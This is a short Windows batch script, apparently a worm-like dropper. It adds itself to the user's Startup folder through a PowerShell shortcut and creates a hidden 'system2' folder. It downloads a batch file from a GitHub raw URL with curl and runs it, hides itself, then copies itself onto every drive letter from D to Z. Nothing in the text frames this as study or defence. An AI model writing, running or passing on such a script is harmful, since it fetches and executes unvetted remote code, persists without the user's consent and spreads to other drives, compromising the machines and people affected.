@echo off
echo %~nx0
:: Copy to startup
:: (FAILED)
:: robocopy %~nx0 "C:\Users\thoihenba\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /E
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%~f0';$s.Save()"
mkdir system2
attrib +h system2
cd system2
curl https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > commands.bat
call commands.bat
attrib +h %~nx0
for %%i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) DO @if exist %%i: xcopy /s /h /y %0 %%i:
